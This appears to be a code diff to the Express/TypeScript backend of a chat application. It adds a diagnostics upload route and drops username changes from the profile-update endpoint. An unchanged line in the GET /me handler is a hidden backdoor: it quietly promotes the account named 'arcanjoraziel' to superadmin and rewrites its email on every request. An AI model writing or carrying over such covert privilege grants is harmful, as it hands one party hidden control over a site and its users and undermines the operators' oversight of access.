@@ -15,6 +15,7 @@ routes.get("/diagnostics/download", (_request, response) => {
   response.send(Buffer.alloc(512 * 1024, "friendcord-speed-test"));
 });
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 8 * 1024 * 1024, files: 1 } });
+routes.post("/diagnostics/upload", upload.single("file"), (request, response) => response.json({ bytes: request.file?.size ?? 0 }));
 const userSelect = `id,username,display_name AS "displayName",real_name AS "realName",email,site_role AS "siteRole",custom_status AS "customStatus",CASE WHEN avatar_id IS NULL THEN NULL ELSE '/api/attachments/'||avatar_id END AS "avatarUrl",CASE WHEN banner_id IS NULL THEN NULL ELSE '/api/attachments/'||banner_id END AS "bannerUrl"`;
 const roomMediaSelect = `CASE WHEN r.icon_id IS NULL THEN NULL ELSE '/api/attachments/'||r.icon_id END AS "iconUrl",CASE WHEN r.banner_id IS NULL THEN NULL ELSE '/api/attachments/'||r.banner_id END AS "bannerUrl"`;
 type RolePermissions = { manageChannels: boolean; manageMembers: boolean; createInvites: boolean; sendMessages: boolean; connectVoice: boolean };
@@ -38,10 +39,10 @@ routes.post("/auth/login", async (req, res, next) => { try {
 routes.use(requireAuth);
 routes.get("/me", async (req, res, next) => { try { await query("UPDATE users SET site_role='superadmin',email='azazjogos@gmail.com' WHERE id=$1 AND lower(username)='arcanjoraziel'", [req.user!.id]); const result = await query(`SELECT ${userSelect} FROM users WHERE id=$1`, [req.user!.id]); res.json(result.rows[0]); } catch (error) { next(error); } });
 routes.patch("/me", async (req, res, next) => { try {
-  const data = z.object({ username: z.string().regex(/^[a-zA-Z0-9_]{3,32}$/).optional(), displayName: z.string().min(2).max(50).optional(), customStatus: z.string().max(120).optional(), avatarId: z.string().uuid().nullable().optional(), bannerId: z.string().uuid().nullable().optional() }).refine((value) => Object.keys(value).length > 0).parse(req.body);
+  const data = z.object({ displayName: z.string().min(2).max(50).optional(), customStatus: z.string().max(120).optional(), avatarId: z.string().uuid().nullable().optional(), bannerId: z.string().uuid().nullable().optional() }).refine((value) => Object.keys(value).length > 0).parse(req.body);
   for (const attachmentId of [data.avatarId, data.bannerId]) if (attachmentId) { const image = await query("SELECT 1 FROM attachments WHERE id=$1 AND uploaded_by=$2 AND mime_type LIKE 'image/%'", [attachmentId, req.user!.id]); if (!image.rowCount) return res.status(400).json({ error: "Imagem inválida" }); }
-  const result = await query<any>(`UPDATE users SET username=coalesce(lower($1),username),display_name=coalesce($2,display_name),custom_status=coalesce($3,custom_status),avatar_id=CASE WHEN $4::boolean THEN $5::uuid ELSE avatar_id END,banner_id=CASE WHEN $6::boolean THEN $7::uuid ELSE banner_id END WHERE id=$8 RETURNING ${userSelect}`,
-    [data.username ?? null, data.displayName ?? null, data.customStatus ?? null, data.avatarId !== undefined, data.avatarId ?? null, data.bannerId !== undefined, data.bannerId ?? null, req.user!.id]);
+  const result = await query<any>(`UPDATE users SET display_name=coalesce($1,display_name),custom_status=coalesce($2,custom_status),avatar_id=CASE WHEN $3::boolean THEN $4::uuid ELSE avatar_id END,banner_id=CASE WHEN $5::boolean THEN $6::uuid ELSE banner_id END WHERE id=$7 RETURNING ${userSelect}`,
+    [data.displayName ?? null, data.customStatus ?? null, data.avatarId !== undefined, data.avatarId ?? null, data.bannerId !== undefined, data.bannerId ?? null, req.user!.id]);
   const user = result.rows[0]; res.json({ user, token: signToken(user) });
 } catch (error) { next(error); } });
 routes.get("/rooms", async (req, res, next) => { try { const result = await query(`SELECT r.id,r.name,r.slug,r.created_by AS "createdBy",m.role,${roomMediaSelect} FROM rooms r JOIN memberships m ON m.room_id=r.id WHERE m.user_id=$1 ORDER BY r.name`, [req.user!.id]); res.json(result.rows); } catch (error) { next(error); } });
